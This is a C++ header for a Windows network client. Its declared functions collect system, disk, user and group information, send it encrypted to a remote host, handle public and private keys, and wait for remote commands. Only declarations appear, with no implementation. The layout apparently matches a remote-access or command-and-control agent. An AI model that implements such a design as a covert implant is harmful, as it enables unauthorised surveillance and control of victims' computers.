#ifndef WIN_CLIENT_H
#define WIN_CLIENT_H

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <array>
#include <sstream>
#include <iomanip>
#include <algorithm>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>
#include <bcrypt.h>
#include <userenv.h>
#include <Lmcons.h>
#include <aclapi.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <shlobj.h> // For SHGetFolderPath and CSIDL_PROFILE

#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

// Function declarations

void initWinsock();

SOCKET connectSocket(const std::string& host, int port);

std::string getOSInfo();

std::string getProcessorInfo();

std::string getMemoryInfo();

std::string getDiskInfo();

std::string getUserInfo();

std::string getUsersAndGroupsInfo();

std::string getAllSystemInfo();

void sendData(SOCKET sock, const char* buffer, int len);

std::vector<char> receivePublicKey(SOCKET sock);

EVP_PKEY* loadPublicKey(const std::vector<char>& pemKey);

void sendData(const SOCKET& sock, const std::string& data, EVP_PKEY* pubKey);

void savePrivateKey(const std::vector<char>& keyData, const std::string& filePath);

void handleCommand(const std::string& cmd);

void waitForCommands(SOCKET& clientSocket);

#endif // WIN_CLIENT_H
